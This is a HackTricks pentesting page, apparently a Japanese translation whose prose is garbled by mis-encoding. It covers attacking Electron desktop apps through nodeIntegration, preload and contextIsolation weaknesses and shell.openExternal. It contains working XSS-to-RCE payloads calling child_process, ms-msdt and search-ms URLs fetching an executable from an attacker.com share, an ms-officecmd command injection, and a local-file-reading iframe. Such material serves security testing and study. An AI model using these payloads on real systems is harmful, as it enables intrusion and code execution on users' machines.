# Electron Desktop Apps

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


## ã¯ã˜ã‚ã«

Electronã¯ã€ãƒ­ãƒ¼ã‚«ãƒ«ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ï¼ˆ**NodeJS**ï¼‰ã¨ãƒ•ãƒ­ãƒ³ãƒˆã‚¨ãƒ³ãƒ‰ï¼ˆ**Chromium**ï¼‰ã‚’çµ„ã¿åˆã‚ã›ã¦ã„ã¾ã™ãŒã€æœ€æ–°ã®ãƒ–ãƒ©ã‚¦ã‚¶ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã®ã„ãã¤ã‹ãŒæ¬ ã‘ã¦ã„ã¾ã™ã€‚

é€šå¸¸ã€Electronã‚¢ãƒ—ãƒªã®ã‚³ãƒ¼ãƒ‰ã¯`.asar`ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å†…ã«è¦‹ã¤ã‹ã‚Šã¾ã™ã€‚ã‚³ãƒ¼ãƒ‰ã‚’å–å¾—ã™ã‚‹ã«ã¯ã€æŠ½å‡ºã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼š
```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```
Electronã‚¢ãƒ—ãƒªã®ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰å†…ã®`packet.json`ã«ã¯ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è¨­å®šãŒè¡Œã‚ã‚Œã¦ã„ã‚‹`main.js`ãƒ•ã‚¡ã‚¤ãƒ«ãŒæŒ‡å®šã•ã‚Œã¦ã„ã¾ã™ã€‚
```json
{
"name": "standard-notes",
"main": "./app/index.js",
```
Electronã«ã¯2ã¤ã®ãƒ—ãƒ­ã‚»ã‚¹ã‚¿ã‚¤ãƒ—ãŒã‚ã‚Šã¾ã™ï¼š

* ãƒ¡ã‚¤ãƒ³ãƒ—ãƒ­ã‚»ã‚¹ï¼ˆNodeJSã¸ã®å®Œå…¨ãªã‚¢ã‚¯ã‚»ã‚¹æ¨©ã‚’æŒã¤ï¼‰
* ãƒ¬ãƒ³ãƒ€ãƒ©ãƒ¼ãƒ—ãƒ­ã‚»ã‚¹ï¼ˆã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¸Šã®ç†ç”±ã‹ã‚‰NodeJSã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ãŒåˆ¶é™ã•ã‚Œã‚‹ã¹ãï¼‰

![](<../../../.gitbook/assets/image (182).png>)

**ãƒ¬ãƒ³ãƒ€ãƒ©ãƒ¼ãƒ—ãƒ­ã‚»ã‚¹**ã¯ã€ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿è¾¼ã‚€ãƒ–ãƒ©ã‚¦ã‚¶ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã«ãªã‚Šã¾ã™ï¼š
```javascript
const {BrowserWindow} = require('electron');
let win = new BrowserWindow();

//Open Renderer Process
win.loadURL(`file://path/to/index.html`);
```
è¨­å®šã¯ã€**renderer process**å†…ã§**main process**ã®main.jsãƒ•ã‚¡ã‚¤ãƒ«ã«**è¨­å®š**ã§ãã¾ã™ã€‚ã„ãã¤ã‹ã®è¨­å®šã¯ã€**è¨­å®šãŒæ­£ã—ãæ§‹æˆã•ã‚Œã¦ã„ã‚‹**å ´åˆã€Electronã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒRCEã‚„ãã®ä»–ã®è„†å¼±æ€§ã‚’**é˜²ã**ã“ã¨ãŒã§ãã¾ã™ã€‚

Electronã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€Node APIã‚’ä»‹ã—ã¦**ãƒ‡ãƒã‚¤ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ãŒã€ãã‚Œã‚’é˜²ãã‚ˆã†ã«æ§‹æˆã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ï¼š

* **`nodeIntegration`** - ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯`off`ã§ã™ã€‚ã‚ªãƒ³ã®å ´åˆã€renderer processã‹ã‚‰Nodeæ©Ÿèƒ½ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚
* **`contextIsolation`** - ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯`on`ã§ã™ã€‚ã‚ªãƒ•ã®å ´åˆã€mainã¨rendererãƒ—ãƒ­ã‚»ã‚¹ã¯åˆ†é›¢ã•ã‚Œã¾ã›ã‚“ã€‚
* **`preload`** - ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ç©ºã§ã™ã€‚
* [**`sandbox`**](https://docs.w3cub.com/electron/api/sandbox-option) - ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã‚ªãƒ•ã§ã™ã€‚NodeJSãŒå®Ÿè¡Œã§ãã‚‹ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’åˆ¶é™ã—ã¾ã™ã€‚
* Workersã«ãŠã‘ã‚‹Node Integration
* **`nodeIntegrationInSubframes`** - ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯`off`ã§ã™ã€‚
* **`nodeIntegration`**ãŒ**æœ‰åŠ¹**ã«ãªã£ã¦ã„ã‚‹å ´åˆã€ã“ã‚Œã¯Electronã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å†…ã®iframeã§**èª­ã¿è¾¼ã¾ã‚ŒãŸ**ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã§**Node.js API**ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã‚’è¨±å¯ã—ã¾ã™ã€‚
* **`nodeIntegration`**ãŒ**ç„¡åŠ¹**ã«ãªã£ã¦ã„ã‚‹å ´åˆã€preloadsã¯iframeå†…ã§èª­ã¿è¾¼ã¾ã‚Œã¾ã™ã€‚

è¨­å®šã®ä¾‹ï¼š
```javascript
const mainWindowOptions = {
title: 'Discord',
backgroundColor: getBackgroundColor(),
width: DEFAULT_WIDTH,
height: DEFAULT_HEIGHT,
minWidth: MIN_WIDTH,
minHeight: MIN_HEIGHT,
transparent: false,
frame: false,
resizable: true,
show: isVisible,
webPreferences: {
blinkFeatures: 'EnumerateDevices,AudioOutputDevices',
nodeIntegration: false,
contextIsolation: false,
sandbox: false,
nodeIntegrationInSubFrames: false,
preload: _path2.default.join(__dirname, 'mainScreenPreload.js'),
nativeWindowOpen: true,
enableRemoteModule: false,
spellcheck: true
}
};
```
ã„ãã¤ã‹ã® **RCEãƒšã‚¤ãƒ­ãƒ¼ãƒ‰** ã¯ [ã“ã¡ã‚‰](https://7as.es/electron/nodeIntegration\_rce.txt) ã‹ã‚‰:
```html
Example Payloads (Windows):
<img src=x onerror="alert(require('child_process').execSync('calc').toString());">

Example Payloads (Linux & MacOS):
<img src=x onerror="alert(require('child_process').execSync('gnome-calculator').toString());">
<img src=x onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());">
<img src=x onerror="alert(require('child_process').execSync('id').toString());">
<img src=x onerror="alert(require('child_process').execSync('ls -l').toString());">
<img src=x onerror="alert(require('child_process').execSync('uname -a').toString());">
```
### ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã®ã‚­ãƒ£ãƒ—ãƒãƒ£

start-mainæ§‹æˆã‚’å¤‰æ›´ã—ã€æ¬¡ã®ã‚ˆã†ãªãƒ—ãƒ­ã‚­ã‚·ã®ä½¿ç”¨ã‚’è¿½åŠ ã—ã¾ã™:
```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```
## Electronãƒ­ãƒ¼ã‚«ãƒ«ã‚³ãƒ¼ãƒ‰ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³

Electronã‚¢ãƒ—ãƒªã‚’ãƒ­ãƒ¼ã‚«ãƒ«ã§å®Ÿè¡Œã§ãã‚‹å ´åˆã€ä»»æ„ã®JavaScriptã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã•ã›ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚æ–¹æ³•ã¯ä»¥ä¸‹ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š

{% content-ref url="../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md" %}
[macos-electron-applications-injection.md](../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md)
{% endcontent-ref %}

## RCE: XSS + nodeIntegration

**nodeIntegration**ãŒ**on**ã«è¨­å®šã•ã‚Œã¦ã„ã‚‹å ´åˆã€ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã®JavaScriptã¯`require()`ã‚’å‘¼ã³å‡ºã™ã ã‘ã§Node.jsã®æ©Ÿèƒ½ã‚’ç°¡å˜ã«ä½¿ç”¨ã§ãã¾ã™ã€‚ä¾‹ãˆã°ã€Windowsã§calcã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã™ã‚‹æ–¹æ³•ã¯æ¬¡ã®é€šã‚Šã§ã™ï¼š
```html
<script>
require('child_process').exec('calc');
// or
top.require('child_process').exec('open /System/Applications/Calculator.app');
</script>
```
<figure><img src="../../../.gitbook/assets/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

ã“ã®è¨­å®šã§ç¤ºã•ã‚ŒãŸã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯**ãƒ¬ãƒ³ãƒ€ãƒ©ãƒ¼å†…ã®ä»–ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã®å‰ã«èª­ã¿è¾¼ã¾ã‚Œ**ã€ã—ãŸãŒã£ã¦**Node APIã¸ã®ç„¡åˆ¶é™ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’æŒã¡ã¾ã™**:
```javascript
new BrowserWindow{
webPreferences: {
nodeIntegration: false,
preload: _path2.default.join(__dirname, 'perload.js'),
}
});
```
ã—ãŸãŒã£ã¦ã€ã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯ãƒãƒ¼ãƒ‰æ©Ÿèƒ½ã‚’ãƒšãƒ¼ã‚¸ã«ã‚¨ã‚¯ã‚¹ãƒãƒ¼ãƒˆã§ãã¾ã™ï¼š

{% code title="preload.js" %}
```javascript
typeof require === 'function';
window.runCalc = function(){
require('child_process').exec('calc')
};
```
{% endcode %}

{% code title="index.html" %}
```html
<body>
<script>
typeof require === 'undefined';
runCalc();
</script>
</body>
```
{% endcode %}

{% hint style="info" %}
**`contextIsolation`ãŒã‚ªãƒ³ã®å ´åˆã€ã“ã‚Œã¯æ©Ÿèƒ½ã—ã¾ã›ã‚“**
{% endhint %}

## RCE: XSS + contextIsolation

_**contextIsolation**_ ã¯ã€**ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã¨JavaScript Electronã®å†…éƒ¨ã‚³ãƒ¼ãƒ‰ã®é–“ã«åˆ†é›¢ã•ã‚ŒãŸã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã‚’å°å…¥**ã—ã€å„ã‚³ãƒ¼ãƒ‰ã®JavaScriptå®Ÿè¡ŒãŒäº’ã„ã«å½±éŸ¿ã‚’ä¸ãˆãªã„ã‚ˆã†ã«ã—ã¾ã™ã€‚ã“ã‚Œã¯RCEã®å¯èƒ½æ€§ã‚’æ’é™¤ã™ã‚‹ãŸã‚ã«å¿…è¦ãªæ©Ÿèƒ½ã§ã™ã€‚

ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆãŒåˆ†é›¢ã•ã‚Œã¦ã„ãªã„å ´åˆã€æ”»æ’ƒè€…ã¯ä»¥ä¸‹ã®ã“ã¨ãŒã§ãã¾ã™ï¼š

1. **ãƒ¬ãƒ³ãƒ€ãƒ©ãƒ¼ã§ä»»æ„ã®JavaScriptã‚’å®Ÿè¡Œ**ï¼ˆXSSã¾ãŸã¯å¤–éƒ¨ã‚µã‚¤ãƒˆã¸ã®ãƒŠãƒ“ã‚²ãƒ¼ã‚·ãƒ§ãƒ³ï¼‰
2. **ãƒ—ãƒªãƒ­ãƒ¼ãƒ‰ã¾ãŸã¯Electronå†…éƒ¨ã‚³ãƒ¼ãƒ‰ã§ä½¿ç”¨ã•ã‚Œã‚‹çµ„ã¿è¾¼ã¿ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä¸Šæ›¸ã**ã—ã¦ç‹¬è‡ªã®é–¢æ•°ã«ã™ã‚‹
3. **ä¸Šæ›¸ãã•ã‚ŒãŸé–¢æ•°ã®ä½¿ç”¨ã‚’ãƒˆãƒªã‚¬ãƒ¼**
4. RCEï¼Ÿ

çµ„ã¿è¾¼ã¿ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä¸Šæ›¸ãã§ãã‚‹å ´æ‰€ã¯2ã¤ã‚ã‚Šã¾ã™ï¼šãƒ—ãƒªãƒ­ãƒ¼ãƒ‰ã‚³ãƒ¼ãƒ‰ã¾ãŸã¯Electronå†…éƒ¨ã‚³ãƒ¼ãƒ‰ï¼š

{% content-ref url="electron-contextisolation-rce-via-preload-code.md" %}
[electron-contextisolation-rce-via-preload-code.md](electron-contextisolation-rce-via-preload-code.md)
{% endcontent-ref %}

{% content-ref url="electron-contextisolation-rce-via-electron-internal-code.md" %}
[electron-contextisolation-rce-via-electron-internal-code.md](electron-contextisolation-rce-via-electron-internal-code.md)
{% endcontent-ref %}

{% content-ref url="electron-contextisolation-rce-via-ipc.md" %}
[electron-contextisolation-rce-via-ipc.md](electron-contextisolation-rce-via-ipc.md)
{% endcontent-ref %}

### ã‚¯ãƒªãƒƒã‚¯ã‚¤ãƒ™ãƒ³ãƒˆã®ãƒã‚¤ãƒ‘ã‚¹

ãƒªãƒ³ã‚¯ã‚’ã‚¯ãƒªãƒƒã‚¯ã™ã‚‹éš›ã«åˆ¶é™ãŒé©ç”¨ã•ã‚Œã¦ã„ã‚‹å ´åˆã€é€šå¸¸ã®å·¦ã‚¯ãƒªãƒƒã‚¯ã®ä»£ã‚ã‚Šã«**ãƒŸãƒ‰ãƒ«ã‚¯ãƒªãƒƒã‚¯**ã‚’è¡Œã†ã“ã¨ã§ãã‚Œã‚’ãƒã‚¤ãƒ‘ã‚¹ã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚
```javascript
window.addEventListener('click', (e) => {
```
## RCE via shell.openExternal

ã“ã®ä¾‹ã«é–¢ã™ã‚‹è©³ç´°ã¯ã€[https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) ãŠã‚ˆã³ [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/) ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚

Electronãƒ‡ã‚¹ã‚¯ãƒˆãƒƒãƒ—ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å±•é–‹ã™ã‚‹éš›ã«ã¯ã€`nodeIntegration` ã¨ `contextIsolation` ã®è¨­å®šãŒæ­£ã—ã„ã“ã¨ã‚’ç¢ºèªã™ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ã€‚**ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆå´ã®ãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ¼ãƒ‰å®Ÿè¡Œ (RCE)** ãŒãƒ—ãƒªãƒ­ãƒ¼ãƒ‰ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚„ãƒ¡ã‚¤ãƒ³ãƒ—ãƒ­ã‚»ã‚¹ã‹ã‚‰ã®Electronã®ãƒã‚¤ãƒ†ã‚£ãƒ–ã‚³ãƒ¼ãƒ‰ã‚’ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã«ã™ã‚‹å ´åˆã€ã“ã‚Œã‚‰ã®è¨­å®šãŒæ•´ã£ã¦ã„ã‚Œã°åŠ¹æœçš„ã«é˜²æ­¢ã•ã‚Œã‚‹ã“ã¨ãŒç¢ºç«‹ã•ã‚Œã¦ã„ã¾ã™ã€‚

ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒãƒªãƒ³ã‚¯ã¨å¯¾è©±ã—ãŸã‚Šæ–°ã—ã„ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã‚’é–‹ã„ãŸã‚Šã™ã‚‹ã¨ã€ç‰¹å®šã®ã‚¤ãƒ™ãƒ³ãƒˆãƒªã‚¹ãƒŠãƒ¼ãŒãƒˆãƒªã‚¬ãƒ¼ã•ã‚Œã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã¨æ©Ÿèƒ½ã«ã¨ã£ã¦é‡è¦ã§ã™ï¼š
```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```
ã“ã‚Œã‚‰ã®ãƒªã‚¹ãƒŠãƒ¼ã¯**ãƒ‡ã‚¹ã‚¯ãƒˆãƒƒãƒ—ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ã‚ˆã£ã¦ã‚ªãƒ¼ãƒãƒ¼ãƒ©ã‚¤ãƒ‰ã•ã‚Œ**ã€ç‹¬è‡ªã®**ãƒ“ã‚¸ãƒã‚¹ãƒ­ã‚¸ãƒƒã‚¯**ã‚’å®Ÿè£…ã—ã¾ã™ã€‚ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€ãƒŠãƒ“ã‚²ãƒ¼ãƒˆã•ã‚ŒãŸãƒªãƒ³ã‚¯ã‚’å†…éƒ¨ã§é–‹ãã¹ãã‹ã€å¤–éƒ¨ã®ã‚¦ã‚§ãƒ–ãƒ–ãƒ©ã‚¦ã‚¶ã§é–‹ãã¹ãã‹ã‚’è©•ä¾¡ã—ã¾ã™ã€‚ã“ã®æ±ºå®šã¯é€šå¸¸ã€`openInternally`ã¨ã„ã†é–¢æ•°ã‚’é€šã˜ã¦è¡Œã‚ã‚Œã¾ã™ã€‚ã“ã®é–¢æ•°ãŒ`false`ã‚’è¿”ã™å ´åˆã€ãƒªãƒ³ã‚¯ã¯å¤–éƒ¨ã§é–‹ãã¹ãã§ã‚ã‚‹ã“ã¨ã‚’ç¤ºã—ã€`shell.openExternal`é–¢æ•°ã‚’åˆ©ç”¨ã—ã¾ã™ã€‚

**ä»¥ä¸‹ã¯ç°¡ç•¥åŒ–ã•ã‚ŒãŸæ“¬ä¼¼ã‚³ãƒ¼ãƒ‰ã§ã™ï¼š**

![https://miro.medium.com/max/1400/1\*iqX26DMEr9RF7nMC1ANMAA.png](<../../../.gitbook/assets/image (261).png>)

![https://miro.medium.com/max/1400/1\*ZfgVwT3X1V\_UfjcKaAccag.png](<../../../.gitbook/assets/image (963).png>)

Electron JSã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ™ã‚¹ãƒˆãƒ—ãƒ©ã‚¯ãƒ†ã‚£ã‚¹ã¯ã€`openExternal`é–¢æ•°ã§ä¿¡é ¼ã§ããªã„ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’å—ã‘å…¥ã‚Œã‚‹ã“ã¨ã‚’é¿ã‘ã‚‹ã‚ˆã†ã«åŠ©è¨€ã—ã¦ã„ã¾ã™ã€‚ã“ã‚Œã¯ã€ã•ã¾ã–ã¾ãªãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’é€šã˜ã¦RCEã‚’å¼•ãèµ·ã“ã™å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ã¯ã€RCEã‚’å¼•ãèµ·ã“ã™å¯èƒ½æ€§ã®ã‚ã‚‹ç•°ãªã‚‹ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã™ã€‚ã“ã®ãƒˆãƒ”ãƒƒã‚¯ã«é–¢ã™ã‚‹è©³ç´°ãªä¾‹ã‚„ã•ã‚‰ãªã‚‹èª¬æ˜ã«ã¤ã„ã¦ã¯ã€[ã“ã®ãƒªã‚½ãƒ¼ã‚¹](https://positive.security/blog/url-open-rce#windows-10-19042)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚ã“ã“ã«ã¯ã€ã“ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã§ãã‚‹Windowsãƒ—ãƒ­ãƒˆã‚³ãƒ«ã®ä¾‹ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚

**Windowsãƒ—ãƒ­ãƒˆã‚³ãƒ«ã®æ‚ªç”¨ã®ä¾‹ã«ã¯ï¼š**
```html
<script>
window.open("ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22")
</script>

<script>
window.open("search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update")
</script>

<script>
window.open("ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D")
</script>
```
## å†…éƒ¨ãƒ•ã‚¡ã‚¤ãƒ«ã®èª­ã¿å–ã‚Š: XSS + contextIsolation

**`contextIsolation`ã‚’ç„¡åŠ¹ã«ã™ã‚‹ã¨ã€ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿å–ã£ã¦å¤–éƒ¨ã«æµå‡ºã•ã›ã‚‹ãŸã‚ã«ã€`<webview>`ã‚¿ã‚°ã‚’ä½¿ç”¨ã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™**ã€‚æä¾›ã•ã‚ŒãŸä¾‹ã¯ã€ã“ã®è„†å¼±æ€§ã‚’åˆ©ç”¨ã—ã¦å†…éƒ¨ãƒ•ã‚¡ã‚¤ãƒ«ã®å†…å®¹ã‚’èª­ã¿å–ã‚‹æ–¹æ³•ã‚’ç¤ºã—ã¦ã„ã¾ã™:

![](<../../../.gitbook/assets/1 u1jdRYuWAEVwJmf\_F2ttJg (1).png>)

ã•ã‚‰ã«ã€**å†…éƒ¨ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿å–ã‚‹**ãŸã‚ã®åˆ¥ã®æ–¹æ³•ãŒå…±æœ‰ã•ã‚Œã¦ãŠã‚Šã€Electronãƒ‡ã‚¹ã‚¯ãƒˆãƒƒãƒ—ã‚¢ãƒ—ãƒªã«ãŠã‘ã‚‹é‡è¦ãªãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«èª­ã¿å–ã‚Šè„†å¼±æ€§ã‚’å¼·èª¿ã—ã¦ã„ã¾ã™ã€‚ã“ã‚Œã«ã¯ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’æ‚ªç”¨ã—ã¦ãƒ‡ãƒ¼ã‚¿ã‚’å¤–éƒ¨ã«æµå‡ºã•ã›ã‚‹ãŸã‚ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’æ³¨å…¥ã™ã‚‹ã“ã¨ãŒå«ã¾ã‚Œã¾ã™:
```html
<br><BR><BR><BR>
<h1>pwn<br>
<iframe onload=j() src="/etc/hosts">xssxsxxsxs</iframe>
<script type="text/javascript">
function j(){alert('pwned contents of /etc/hosts :\n\n '+frames[0].document.body.innerText)}
</script>
```
## **RCE: XSS + å¤ã„Chromium**

ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹**chromium**ãŒ**å¤ã„**å ´åˆã€**æ—¢çŸ¥ã®****è„†å¼±æ€§**ãŒã‚ã‚‹ã¨ã€**ãã‚Œã‚’æ‚ªç”¨ã—ã¦XSSã‚’é€šã˜ã¦RCEã‚’å–å¾—ã™ã‚‹**ã“ã¨ãŒå¯èƒ½ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚\
ã“ã®**writeup**ã®ä¾‹ã‚’å‚ç…§ã—ã¦ãã ã•ã„: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)

## **å†…éƒ¨URLã®æ­£è¦è¡¨ç¾ãƒã‚¤ãƒ‘ã‚¹ã«ã‚ˆã‚‹XSSãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°**

XSSã‚’è¦‹ã¤ã‘ãŸãŒã€**RCEã‚’ãƒˆãƒªã‚¬ãƒ¼ã§ããªã„ã‹å†…éƒ¨ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ç›—ã‚€ã“ã¨ãŒã§ããªã„**å ´åˆã€**ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°ã‚’é€šã˜ã¦è³‡æ ¼æƒ…å ±ã‚’ç›—ã‚€**ãŸã‚ã«ãã‚Œã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã‚’è©¦ã¿ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã¾ãšã€ãƒ•ãƒ­ãƒ³ãƒˆã‚¨ãƒ³ãƒ‰ã®JSã‚³ãƒ¼ãƒ‰ã‚’ç¢ºèªã—ã¦ã€æ–°ã—ã„URLã‚’é–‹ã“ã†ã¨ã—ãŸã¨ãã«ä½•ãŒèµ·ã“ã‚‹ã‹ã‚’çŸ¥ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```
**`openInternally`**ã¸ã®å‘¼ã³å‡ºã—ã¯ã€**ãƒªãƒ³ã‚¯**ãŒãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã«å±ã™ã‚‹ãƒªãƒ³ã‚¯ã§ã‚ã‚‹ãŸã‚ã€**ãƒ‡ã‚¹ã‚¯ãƒˆãƒƒãƒ—ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦**ã§**é–‹ã‹ã‚Œã‚‹**ã‹ã€**ãƒ–ãƒ©ã‚¦ã‚¶ã®3rdãƒ‘ãƒ¼ãƒ†ã‚£ãƒªã‚½ãƒ¼ã‚¹**ã¨ã—ã¦**é–‹ã‹ã‚Œã‚‹**ã‹ã‚’æ±ºå®šã—ã¾ã™ã€‚

